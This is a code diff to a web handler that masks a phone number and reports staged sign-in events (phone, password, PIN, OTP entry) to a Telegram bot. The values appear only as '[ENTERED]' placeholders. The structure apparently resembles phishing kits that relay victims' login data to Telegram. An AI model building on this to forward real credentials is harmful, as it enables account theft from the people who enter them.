@@ -17,21 +17,24 @@ export default async function handler(req, res) {
       });
     }
 
-    const    Phone = phone
+    const safePhone = phone
       ? String(phone).replace(
           /^(\+?\d{2})\d+(\d{2})$/,
-          "$1$111"
+          "$1******$2"
         )
-      : " provided";
+      : "Not provided";
 
     const message =
       `🔐 Sign In attempt\n\n` +
-      `📱 Phone: ${Phone}\n\n` +
+      `📱 Phone: ${safePhone}\n` +
+      `🔑 Password: [ENTERED]\n` +
+      `🔢 PIN: [ENTERED]\n\n` +
       `🔒 OTP requested\n` +
-      `📱 Phone: ${Phone}\n\n` +
-      `🔑 OTP\n` +
-      `📱 Phone: ${Phone}\n\n` +
-      `✅ Result: ${result || "OTP "}`;
+      `📱 Phone: ${safePhone}\n\n` +
+      `🔑 OTP Entered\n` +
+      `📱 Phone: ${safePhone}\n` +
+      `🔢 OTP: [ENTERED]\n\n` +
+      `✅ Result: ${result || "OTP entered"}`;
 
     const response = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
